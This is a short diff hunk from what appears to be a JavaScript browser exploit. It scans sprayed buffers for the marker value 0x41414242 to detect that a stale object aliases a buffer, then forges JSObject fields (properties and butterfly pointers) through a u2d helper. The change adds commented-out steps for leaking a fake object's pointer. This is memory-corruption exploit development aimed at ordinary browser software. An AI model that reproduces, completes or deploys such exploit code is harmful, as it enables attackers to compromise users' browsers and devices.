@@ -170,7 +170,13 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//alert("Found the object!!");
+				// Create fakeobj for fixing butterfly ptr
+ 				//var fakeobj = {};
+ 				
+ 				// leak fakeobj pointer
+ 				//stale[0] = fakeobj;
+ 				//var fop = bufs[i][k];
+ 				
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
